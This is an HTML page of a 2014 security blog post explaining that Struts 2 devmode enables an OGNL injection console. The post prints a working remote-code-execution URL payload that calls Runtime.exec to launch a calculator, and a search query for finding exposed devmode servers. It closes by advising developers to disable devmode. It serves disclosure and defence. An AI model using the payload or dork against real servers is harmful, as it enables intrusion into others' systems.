@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Struts 2 devmode: An OGNL backdoor</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="There are many Struts 2 developers familiar with the Struts 2 development mode on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. What it is not so well known (actually it doesn’t even appear in the Struts 2 devmode site) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Struts 2 devmode: An OGNL backdoor">
+    <meta name="twitter:description" content="There are many Struts 2 developers familiar with the Struts 2 development mode on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. What it is not so well known (actually it doesn’t even appear in the Struts 2 devmode site) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Struts 2 devmode: An OGNL backdoor">
+  <meta property="og:description" content="There are many Struts 2 developers familiar with the Struts 2 development mode on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. What it is not so well known (actually it doesn’t even appear in the Struts 2 devmode site) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Struts 2 devmode: An OGNL backdoor</h1>
+      <p class="post-meta">@pwntester · Jan 21, 2014 · 2 min read</p>
+    </header>
+    <article class="post-content"><p>There are many Struts 2 developers familiar with the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">development mode</a> on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on.
+What it is not so well known (actually it doesn’t even appear in the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">devmode site</a>) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter. This handy feature for developers turns into a security nightmare if application is released into production servers with this flag on.</p>
+
+<p>If we look at the <a href="http://struts.apache.org/release/2.3.x/docs/debugging.html">“debugging” page</a>, we can find some info on how it works. It enables the <a href="http://struts.apache.org/release/2.3.x/docs/debugginginterceptor.html">debugging interceptor</a> which brings us some interesting commands:</p>
+
+<ul>
+<li><strong>xml</strong>: Dumps the parameters, context, session, and value stack as an XML document.</li>
+<li><strong>console</strong>: Shows a popup &lsquo;OGNL Console&rsquo; that allows the user to test OGNL expressions against the value stack. The XML data from the &lsquo;xml&rsquo; mode is inserted at the top of the page.</li>
+</ul>
+
+<p><img src="/images/octopress/devmode-1.png" alt="" /></p>
+
+<ul>
+<li><strong>command</strong>: Tests an OGNL expression and returns the string result. Only used by the OGNL console.</li>
+<li><strong>browser</strong>: Shows field values of an object specified in the object parameter (#context by default). When the object parameters is set, the &lsquo;#&rsquo; character needs to be escaped to &lsquo;%23&rsquo;. Like debug=browser&amp;object=%23parameters</li>
+</ul>
+
+<p><img src="/images/octopress/devmode-2.png" alt="" /></p>
+
+<p>So we can abuse this feature to run our arbitrary commands by loading the following page:</p>
+
+<pre><code class="language-lang-bash">http://vulnserver.com/some.action?debug=command&amp;expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,@java.lang.Runtime@getRuntime%28%29.exec%28%27/Applications/Calculator.app/Contents/MacOS/Calculator%27%29
+</code></pre>
+
+<p>Note that this will work even with the latest Struts 2 version (where “allowStaticMethodAccess” is immutable) using the payload explained in this <a href="http://www.pwntester.com/blog/2014/01/20/time-to-update-your-ognl-payloads/">previous post</a></p>
+
+<p>Now, you may be wondering who releases its applications in devmode? Go, check it yourself:</p>
+
+<pre><code class="language-lang-bash">https://www.google.com/search?q=intitle%3A%22Struts+Problem+Report%22+%22You+are+seeing+this+page+because+development+mode+is+enabled.%22
+</code></pre>
+
+<p>So, don’t forget to disable devmode before releasing your applications to production.</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/java"><span class="tag">Java</span></a></li>
+        
+          <li><a href="/tags/ognl"><span class="tag">OGNL</span></a></li>
+        
+          <li><a href="/tags/struts2"><span class="tag">Struts2</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2102</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
